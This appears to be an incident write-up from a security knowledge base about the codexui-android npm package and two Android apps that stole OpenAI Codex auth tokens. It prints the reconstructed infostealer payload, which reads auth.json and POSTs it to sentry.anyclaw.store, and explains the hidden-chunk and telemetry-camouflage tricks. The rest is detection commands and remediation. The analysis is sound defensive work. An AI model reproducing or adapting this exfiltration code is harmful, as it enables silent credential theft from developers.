# codexui-android — Legitimate-Looking npm Package Silently Exfiltrates OpenAI Codex Auth Tokens

**Date:** May 2026
**Ecosystem:** npm / Android (Google Play)
**Severity:** High
**Type:** Trojanized Legitimate Package / Infostealer
**Sources:**
- [Aikido — Legitimate-Looking Codex Remote UI Secretly Steals Your AI Tokens](https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens)

---

## Summary

`codexui-android` is a functional remote web UI for OpenAI Codex with 27,000 weekly npm downloads and an active GitHub repository. For approximately one month, every published version silently exfiltrated the user's Codex authentication tokens (`~/.codex/auth.json`) to an attacker-controlled server on every startup. The malicious exfiltration code existed only in the published npm package, never in the GitHub source — making source-code audits useless as a defence.

What distinguishes this attack is that the package was genuinely useful. There was no typosquatting, no throwaway name, and no suspicious download spike to alert defenders. The threat actor built real user trust before weaponising it. The stolen `refresh_token` does not expire, meaning attackers could maintain silent, persistent access to a victim's Codex account long after the package was removed.

The attack extended beyond npm. The same publisher distributed two Android apps on Google Play — "OpenClaw Codex Claude AI Agent" and "Codex" — both of which bootstrapped a Termux-derived Linux userland, pulled `codexui-android@latest` on first launch (unpinned, so always malicious), and relayed the same exfiltration chain. The publisher's unrelated gaming app "Brutal Strike" (5M+ installs) was found clean, indicating a deliberate targeting of AI developer users specifically.

---

## Compromised Artifacts

| Package / App | Malicious Version(s) |
|---------------|---------------------|
| `codexui-android` (npm) | v0.1.82 and later (~1 month of published versions) |
| "OpenClaw Codex Claude AI Agent" (Google Play, `gptos.intelligence.assistant`) | All versions using unpinned `pnpm add codexui-android@latest` |
| "Codex" (Google Play, `codex.app`) | All versions using unpinned `pnpm add codexui-android@latest` |

---

## How It Worked

### Entry Point

The published npm tarball contained a hidden chunk file (`dist-cli/chunk-PUR7OUAG.js`) not present in the GitHub repository. The package entry point imports it unconditionally:

```javascript
#!/usr/bin/env node
import "./chunk-PUR7OUAG.js"; // fires before any application code
```

This runs on every invocation — no user action, flag, or condition required.

### Payload Mechanics

```javascript
// reads ~/.codex/auth.json (or $CODEX_HOME/auth.json)
function readAuth() {
  const authPath = join(getCodexHomePath(), "auth.json");
  if (!existsSync(authPath)) return null;
  return JSON.parse(readFileSync(authPath, "utf8"));
}

// XOR-encrypts with key "anyclaw2026", base64-encodes, POSTs
function sendToStartlog(auth) {
  const payload = xorEncrypt(JSON.stringify(auth));
  const req = httpsRequest({
    hostname: "sentry.anyclaw.store",
    path: "/startlog",
    method: "POST",
    headers: { "User-Agent": `codexui/${readPackageVersion()}` },
  }, () => {});
  req.on("error", () => {}); // errors suppressed silently
  req.end(payload);
}

const auth = readAuth();
if (auth && (auth?.tokens?.refresh_token || auth?.tokens?.access_token)) {
  sendToStartlog(auth); // the whole file, every time
}
```

The attacker left a comment in the source map: `// Send tokens to our startlog endpoint (always, independent of Sentry)` — the word "always" confirms intentional, unconditional exfiltration.

### Exfiltration Camouflage

The C2 endpoint is `sentry.anyclaw.store` — named to blend with legitimate Sentry error-reporting traffic. A developer monitoring network activity sees `sentry.*` connections and assumes crash telemetry. The POST uses `Content-Type: application/json` with a standard `User-Agent` header, further blending into normal package telemetry traffic.

### What Gets Stolen

The entire `auth.json` file is sent, containing:
- `access_token` — immediate API access
- `refresh_token` — **non-expiring**, enables silent impersonation indefinitely
- `id_token` — identity assertion
- `account_id` — OpenAI account identifier

### Android Delivery Vector

Both Google Play apps used an identical bootstrap:

```bash
pnpm add codexui-android@latest --prefer-offline --config.node-linker=hoisted
exec node /usr/local/lib/node_modules/codexui-android/dist-cli/index.js --port <port>
```

The version is unpinned, so all devices pull whatever is currently live on npm. The app runs Node.js inside a PRoot sandbox via a bundled Termux-derived Linux userland (`rootfs.tar.zst.bin`). When the user signs into Codex inside the app, the auth tokens are written to the sandbox's `auth.json`, immediately read by the malicious chunk, and exfiltrated. The two apps share the same `app.anyclaw.*` Kotlin namespace and `anyclaw://auth/codex-callback` OAuth callback URI, confirming a common author.

---

## Timeline

| Date | Event |
|------|-------|
| ~Apr 27, 2026 | Malicious code first introduced (v0.1.82 onward), ~1 month before discovery |
| May 27, 2026 | Aikido publishes disclosure; package flagged |
| May 27–28, 2026 | Author claims npm account was compromised in a now-deleted GitHub comment |
| May 28, 2026 | Aikido article updated with author statement (does not address findings) |

---

## Detection

```bash
# Check if codexui-android is installed
npm ls codexui-android
npx codexui-android --version 2>/dev/null

# Check for the malicious chunk in the installed package
find $(npm root -g)/codexui-android/dist-cli -name "chunk-*.js" 2>/dev/null
# OR for local installs:
find node_modules/codexui-android/dist-cli -name "chunk-*.js" 2>/dev/null

# Inspect the chunk file for the exfil indicator
grep -r "anyclaw\|startlog\|xorEncrypt" node_modules/codexui-android/ 2>/dev/null

# Check for suspicious POST traffic to sentry.anyclaw.store in network logs
# On macOS (check proxy/firewall logs):
log show --predicate 'process == "node" && eventMessage contains "anyclaw"' --last 30d 2>/dev/null

# Check if Codex auth file was read recently
ls -la ~/.codex/auth.json 2>/dev/null
stat ~/.codex/auth.json 2>/dev/null

# On Android: check if either app is installed
# Package IDs: gptos.intelligence.assistant, codex.app (Kotlin namespace: app.anyclaw.*)
adb shell pm list packages | grep -E "gptos\.intelligence|codex\.app"
```

---

## Remediation

1. **Remove the package immediately:**
   ```bash
   npm uninstall codexui-android
   npm uninstall -g codexui-android
   ```
2. **Revoke and rotate Codex credentials:** Log into your OpenAI account, revoke all active sessions and API keys. A stolen `refresh_token` does not expire — assume any account that ran a malicious version is fully compromised until tokens are rotated.
3. **Uninstall Android apps:** Remove "OpenClaw Codex Claude AI Agent" and "Codex" (`codex.app`) from any Android devices and revoke their OAuth permissions from your OpenAI account.
4. **Audit CI/CD environments:** Check if any pipeline installed `codexui-android` and rotate all secrets accessible in those environments.
5. **Review OpenAI account activity** for any unexpected API calls or access from unfamiliar IP addresses during the ~1-month exposure window.
6. **Cross-reference `sentry.anyclaw.store` in DNS/proxy logs** to identify affected machines.

---

## Lessons Learned

- A useful, well-maintained-looking package is a more dangerous supply chain vector than a throwaway typosquat — attackers investing in authentic-looking infrastructure can evade the heuristics developers typically apply
- Exfiltration code hidden only in the published npm tarball (not in the GitHub source) defeats source-code review as a security control — only comparing published package content to source code or using lockfile integrity checks would have caught this
- Unpinned `@latest` installs in mobile apps that bootstrap npm packages create a silent, always-updated malware delivery channel outside normal app-store review processes
- Non-expiring OAuth refresh tokens are high-value theft targets: unlike session tokens, a stolen refresh token requires no further attacker interaction and persists indefinitely
- AI developer tooling tokens (OpenAI, Anthropic, etc.) are increasingly targeted; the power and longevity of these tokens make them equivalent to cloud IAM credentials in terms of attack value

---

## Related Incidents

- [./2026-05-node-ipc-npm-infostealer.md](./2026-05-node-ipc-npm-infostealer.md) — npm infostealer with DNS exfiltration targeting AI tool configs
- [./2026-02-cline-openclaw.md](./2026-02-cline-openclaw.md) — Cline AI agent npm package compromise installing persistent agent daemon
- [./2025-10-postmark-mcp-bcc-injection.md](./2025-10-postmark-mcp-bcc-injection.md) — Malicious MCP server targeting AI-agent email traffic
- [./2026-01-gwagon-npm-infostealer.md](./2026-01-gwagon-npm-infostealer.md) — npm infostealer with memory-only payload targeting crypto wallets and cloud keys
